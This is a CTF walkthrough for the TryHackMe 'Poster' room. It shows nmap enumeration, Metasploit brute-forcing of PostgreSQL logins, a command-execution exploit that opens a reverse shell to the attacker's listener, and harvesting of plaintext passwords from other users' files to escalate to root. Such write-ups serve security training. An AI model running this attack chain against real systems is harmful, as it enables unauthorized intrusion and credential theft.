# Poster

The room [Poster](https://tryhackme.com/room/poster) on TryHackMe is based on exploiting postgresql which is an RDBMS. Along with that the room also includes privilege escalation.

In this room, I have not answered a few question as we directly need to copy and paste the path from metasploit to the room's answer section, rather I'll be focusing more on completing the room and gaining the flags.



### Initial Foothold

The first thing that we can do after deploying the machine is run an nmap scan against the IP address to find all the open ports.

```
tester@kali:~/Downloads/poster$ nmap -A 10.10.179.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 23:03 IST
Nmap scan report for 10.10.179.1
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.78 seconds
```

1. #####  What is the rdbms installed on the server?

From the nmap scan it is clearly visible which RDBMS is present on the machine.

2. ##### What port is the rdbms running on?

Along with it's name, we can also see the port on which the RDBMS is running on the machine.

4. ##### After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

We can start `msfconsole` and look for scanners and exploits related to `postgres` over there. We can see on module describes as 'Login Utility'. We can use it to enumerate user credentials. Also, the same module is the answer for this question.

5. ##### What are the credentials you found?

To run the scanner we need to first set the rhosts and lhost values. 

````
msf5 auxiliary(scanner/postgres/postgres_login) > set rhosts 10.10.179.1
rhosts => 10.10.179.1
msf5 auxiliary(scanner/postgres/postgres_login) > set lhost tun0
lhost => tun0
msf5 auxiliary(scanner/postgres/postgres_login) > run
````

Once we run the scanner, in some time we get the correct pair of username and password.

```
msf5 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.179.1:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.179.1:5432 - Login Successful: xxxxxxxx:xxxxxxxx@template1
[-] 10.10.179.1:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.179.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/postgres/postgres_lo
```

This pair of username and password can be submitted as the answer to the fifth question.

We can now look for some exploit for the same RDBMS to gain access to the machine. 

11. ##### What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

From the list of exploits when we search for `postgres` in metasploit, we can see one module defined as 'copy from program command execution'. We can use it to gain access to the machine and also submit the name of that module as the answer to the eleventh question.

12. #####  Compromise the machine and locate user.txt

To use the module we need to set the rhost, username, password and lhost values.

```
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhosts 10.10.179.1
rhosts => 10.10.179.1
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set username xxxxxxxx
username => postgres
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password xxxxxxxx
password => password
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost tun0
lhost => 10.8.91.135
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
```

Once we run the module, we get a shell as user `postgres`. 

```
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.8.91.135:4444 
[*] 10.10.179.1:5432 - 10.10.179.1:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.179.1:5432 - Exploiting...
[+] 10.10.179.1:5432 - 10.10.179.1:5432 - m2t5d2dp3tE dropped successfully
[+] 10.10.179.1:5432 - 10.10.179.1:5432 - m2t5d2dp3tE created successfully
[+] 10.10.179.1:5432 - 10.10.179.1:5432 - m2t5d2dp3tE copied successfully(valid syntax/command)
[+] 10.10.179.1:5432 - 10.10.179.1:5432 - m2t5d2dp3tE dropped successfully(Cleaned)
[*] 10.10.179.1:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.8.91.135:4444 -> 10.10.179.1:36968) at 2020-09-20 23:41:02 +0530

whoami
postgres
pwd
/var/lib/postgresql/9.5/main
```

On trying to explore, we can see that we stay stuck in the same directory. So, in order to access any directory we need to mention it's full path. We can look for different users and their directories in `/home`.

```
ls -la /home/alison 
total 40
drwxr-xr-x 4 alison alison 4096 Jul 28 20:26 .
drwxr-xr-x 4 root   root   4096 Jul 28 20:13 ..
-rw------- 1 alison alison 2444 Jul 28 20:37 .bash_history
-rw-r--r-- 1 alison alison  220 Jul 28 14:30 .bash_logout
-rw-r--r-- 1 alison alison 3771 Jul 28 14:30 .bashrc
drwx------ 2 alison alison 4096 Jul 28 14:42 .cache
drwxr-xr-x 2 alison alison 4096 Jul 28 20:13 .nano
-rw-r--r-- 1 alison alison  655 Jul 28 14:30 .profile
-rw-r--r-- 1 alison alison    0 Jul 28 14:42 .sudo_as_admin_successful
-rw------- 1 alison alison   35 Jul 28 20:26 user.txt
-rw-r--r-- 1 root   root    183 Jul 28 17:18 .wget-hsts
cat /home/alison/user.txt
```

Here, we can see that the user flag is in alison's directory but as we don't have the access to read his files we can print the content of `user.txt`. Moving on the dark's directory, we can find a file named `credentials.txt`.

```
ls -la /home/dark
total 28
drwxr-xr-x 2 dark dark 4096 Jul 28 20:33 .
drwxr-xr-x 4 root root 4096 Jul 28 20:13 ..
-rw------- 1 dark dark   26 Jul 28 20:33 .bash_history
-rw-r--r-- 1 dark dark  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 dark dark 3771 Aug 31  2015 .bashrc
-rwxrwxrwx 1 dark dark   24 Jul 28 20:15 credentials.txt
-rw-r--r-- 1 dark dark  655 May 16  2017 .profile
cat /home/dark/credentials.txt
dark:******************
```

In that file, we can find the password for user dark. So, we can try to access the machine via SSH and use dark's credentials.

```
tester@kali:~/Downloads/poster$ ssh dark@10.10.179.1
The authenticity of host '10.10.179.1 (10.10.179.1)' can't be established.
ECDSA key fingerprint is SHA256:9sVne2iRYnXtCm1g5M0jwlzBMg0GmByloIG6c7gDlgA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.179.1' (ECDSA) to the list of known hosts.
dark@10.10.179.1's password: 
Permission denied, please try again.
dark@10.10.179.1's password: 
Last login: Tue Jul 28 20:27:25 2020 from 192.168.85.142
$ whoami
dark
$ pwd
/home/dark
```

Again, now we can try to access the `user.txt` in alison's directory:

```
$ cat /home/alison/user.txt
cat: /home/alison/user.txt: Permission denied
```

We can check for the commands that we can run as root using the command `sudo -l` and also check if there is some cronjob that we can use through the command `cat /etc/crontab`.

```
$ sudo -l
[sudo] password for dark: 
Sorry, user dark may not run sudo on ubuntu.
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /opt/ufw && bash ufw.sh
```

But there is no success over here as well. We are not allowed any commands as sudo nor are there any useful cronjobs running. So, the next thing that we can do is check for different files that we own. And even in that case we don't find any useful file. So, we can look for files which are owned by alison and then we can try to access those files.

```
$ find / -user alison 2> /dev/null
```

The output is too long, hence not posting it here. 

From the output we can see that there are a number of files in the directory `/var/www/html` to which alison has access. We can check those files and check if we can find some useful information over there.

```
$ cd /var/www/html
$ ls -la
total 16
drwxr-xr-x 3 root   root   4096 Jul 28 20:22 .
drwxr-xr-x 3 root   root   4096 Jul 28 20:12 ..
-rwxrwxrwx 1 alison alison  123 Jul 28 21:07 config.php
drwxr-xr-x 4 alison alison 4096 Jul 28 20:22 poster
$ cat config.php
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "****************";
	$dbname = "mysudopassword";
```

We can find a `config.php` file which contains the password for user alison. So, now we can switch user as alison.

```
?>$ su alison
Password: 
alison@ubuntu:/var/www/html$ 
```

Now, the first thing that we shall do is get the user flag.

```
alison@ubuntu:/var/www/html$ cd /home/alison/
alison@ubuntu:~$ cat user.txt
```

Now, we have the user flag which we can submit to the twelfth question.

### Privilege Escalation

13. ##### Escalate privileges and obtain root.txt

 We can check for the commands that we can execute as user alison:

```
alison@ubuntu:~$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

And it appears that alison can run all the commands as root. Hence, we can directly print the `root.txt`  file.

```
alison@ubuntu:~$ sudo cat /root/root.txt
```

So, we have the root flag as well and hence we can say that we have solved this room!